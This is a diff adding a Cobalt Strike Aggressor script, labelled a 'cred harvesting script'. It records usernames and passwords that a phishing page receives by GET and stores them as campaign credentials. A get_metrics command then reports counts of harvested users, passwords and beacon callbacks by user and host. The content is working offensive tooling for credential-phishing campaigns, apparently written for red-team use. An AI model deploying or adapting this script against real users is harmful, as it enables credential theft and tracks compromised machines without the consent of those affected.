@@ -1,0 +1,133 @@
+#===================================#
+#									#
+#	cred harvesting script			#
+#	author: karen miller			#
+#									#
+#===================================#
+
+#===================================================================#
+#																	#
+#	usage: load this script into cobalt strike						#
+#	automatically adds incoming form data creds to cobalt strike	#
+#	in script console run: 'get_metrics' to see cred/session data	#
+#																	#
+#===================================================================#
+
+# this script needs to be loaded at the start of the credential harvesting campaign in order to accurately gather credentials
+# if the script is only being used for the get_metrics command, then it can be loaded anytime
+
+# the web_hit event function is specifically set up to record all GET requests that include username/password form data
+# the web_hit event function should be modified if utilizing POST and/or other formats of credential submission
+
+
+on web_hit {
+
+	if (($1 eq "GET") && ("index.html" isin $2) && ("username" isin $8)) {
+
+		credential_add("$8['username']", "$8['password']", "", "credential_harvest_campaign", "");
+
+	}
+
+}
+
+
+command get_metrics {
+
+	# credential counts are dependent on the source being listed as "credential_harvest_campaign"
+	get_creds();
+
+	# session counts only include sessions that have not been removed from the beacon list
+	get_sessions();
+
+}
+
+
+sub get_creds {
+	
+	@credentials = credentials();
+	@users = @();
+	@passwords = @();
+	@pcreds = @();
+
+	foreach $cred (@credentials) {
+
+		if ($cred['source'] == "credential_harvest_campaign") {
+		
+			$user = $cred['user'];
+			$pass = $cred['password'];
+			push (@pcreds, $cred);
+
+			if (iff($user in @users,false,true)) {
+
+				push (@users, $user);
+
+			}
+
+			if (iff($pass in @passwords,false,true)) {
+
+				push (@passwords, $pass);
+
+			}
+
+		}
+
+	}
+
+	$totalu = size(@users);
+	$totalp = size(@passwords);
+	$totalc = size(@pcreds);
+
+	$uniqueu = "[*] Unique users who submitted credentials:  $totalu";
+	$uniquep = "[*] Unique passwords submitted:  $totalp";
+	$allc = "[*] Total credentials submitted:  $totalc";
+
+	println($uniqueu);
+	println();
+	println($uniquep);
+	println();
+	println($allc);
+	println();
+
+}
+
+sub get_sessions {
+
+	@sessions = beacons();
+	@susers = @();
+	@shosts = @();
+
+	foreach $session (@sessions) {
+		
+		if (iff($session['user'] in @susers,false,true)) {
+
+			push(@susers, $session['user']);
+
+		}
+
+		if (iff($session['computer'] in @shosts,false,true)) {
+
+			push(@shosts, $session['computer']);
+
+		}
+		
+	}
+	
+	println("\c5\U[!] If additonal beacons were generated manually, subtract them from the relevant counts: \U");
+	println();
+
+	$totalsu = size(@susers);
+	$totalsh = size(@shosts);
+	$totals = size(@sessions);
+
+	$uniqueus = "[*] Unique callbacks received (by user):  $totalsu";
+	$uniquehs = "[*] Unique callbacks received (by host):  $totalsh";
+	$alls = "[*] Total callbacks received:  $totals";
+
+	println($uniqueus);
+	println();
+	println($uniquehs);
+	println();
+	println($alls);
+	println();
+
+}
